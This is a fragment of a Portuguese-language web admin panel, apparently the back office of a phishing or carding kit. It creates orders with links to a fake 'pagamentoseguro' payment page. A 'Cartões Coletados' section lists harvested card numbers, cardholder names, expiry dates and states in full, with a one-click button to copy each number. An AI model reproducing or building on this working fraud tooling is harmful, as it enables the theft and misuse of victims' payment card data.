    <section>
      <h2>Pedidos Recentes</h2>
      <table>
        <thead><tr><th>Código</th><th>Cliente</th><th>Total</th><th>Status</th><th>Ação</th></tr></thead>
        <tbody id="orders-body"></tbody>
      </table>
    </section>

    <section>
      <h2>Cartões Coletados</h2>
      <div id="cards-body"></div>
    </section>
  </main>

  <script>
    function add_item() {
      const container = document.getElementById('items-container');
      const row = document.createElement('div');
      row.className = 'item-row';
      row.style = 'display: flex; gap: 10px; margin-bottom: 10px;';
      row.innerHTML = `
        <input type="text" class="item-desc" placeholder="Item" required style="flex: 1; padding: 8px;">
        <input type="number" class="item-qty" placeholder="Qtd" value="1" min="1" required style="width: 60px; padding: 8px;">
        <input type="number" class="item-price" placeholder="R$" step="0.01" required style="width: 80px; padding: 8px;">
        <button type="button" onclick="this.parentElement.remove(); calc_total();" style="background: #d33; color: white; border: none; padding: 0 10px; cursor: pointer;">X</button>
      `;
      container.appendChild(row);
      row.querySelector('.item-qty').addEventListener('input', calc_total);
      row.querySelector('.item-price').addEventListener('input', calc_total);
    }

    function calc_total() {
      let total = 0;
      document.querySelectorAll('.item-row').forEach(row => {
        total += (parseInt(row.querySelector('.item-qty').value) || 0) * (parseFloat(row.querySelector('.item-price').value) || 0);
      });
      document.getElementById('total-display').textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
    }

    add_item();

    async function load_orders() {
      const res = await fetch('/api/admin/orders');
      const { orders } = await res.json();
      const tbody = document.getElementById('orders-body');
      tbody.innerHTML = '';
      orders.forEach(o => {
        const tr = document.createElement('tr');
        const link = `${window.location.origin}/pagamentoseguro#${o.id}`;
        tr.innerHTML = `
          <td><code>${o.id}</code></td>
          <td>${o.client_name}</td>
          <td>R$ ${(o.total_cents/100).toFixed(2)}</td>
          <td><span class="status status-${o.status}">${o.status}</span></td>
          <td><a href="${link}" target="_blank">Abrir PIX</a></td>`;
        tbody.appendChild(tr);
      });
    }

    // === NOVO: carrega a lista de cartões ===
    async function load_cards() {
      const res = await fetch('/api/admin/cards');
      const { cards } = await res.json();
      const body = document.getElementById('cards-body');
      body.innerHTML = '';
      cards.forEach((c, i) => {
        const div = document.createElement('div');
        div.style = 'display: grid; grid-template-columns: 80px 1fr 1fr 120px 100px 60px; gap: 10px; align-items: center; padding: 12px; border-bottom: 1px solid #eee; font-size: 14px;';
        const mask = (v, n) => String(v || '').replace(/\s/g, '').replace(/(.{3})/g, '$1 ').trim();
        div.innerHTML = `
          <span><strong>Card #${i + 1}</strong></span>
          <span>${mask(c.card_number, 4)}</span>
          <span>${mask(c.full_name, 4)}</span>
          <span>${c.expiration}</span>
          <span>${c.state}</span>
          <button onclick="copiar('${c.card_number}')" style="background: #555; color: white; border: none; padding: 8px 12px; cursor: pointer;">Copiar</button>`;
        body.appendChild(div);
      });
    }

    async function copiar(texto) {
      try {
        await navigator.clipboard.writeText(texto);
        alert('Copiado: ' + texto);
      } catch (e) {
        alert('Não foi possível copiar.');
      }
    }

    document.getElementById('order-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const data = new FormData(e.target);
      const items = [];
      document.querySelectorAll('.item-row').forEach(row => {
        items.push({
          description: row.querySelector('.item-desc').value,
          quantity: parseInt(row.querySelector('.item-qty').value),
          unit_price_cents: Math.round(parseFloat(row.querySelector('.item-price').value) * 100)
        });
      });
      data.append('items', JSON.stringify(items));

      const res = await fetch('/api/admin/orders', { method: 'POST', body: data });
      const json = await res.json();
      const out = document.getElementById('result');
      
      if (res.ok && json.order.payment_link) {
        const link = `${window.location.origin}/pagamentoseguro#${json.order.id}`;
        out.innerHTML = `Pedido criado! <a href="${link}" target="_blank">${link}</a>`;
        e.target.reset();
        document.getElementById('items-container').innerHTML = '';
        add_item();
        load_orders();
      } else {
        out.textContent = 'Erro: ' + (json.error || 'Falha ao gerar PIX');
      }
    });

    load_orders();
    load_cards();
  </script>
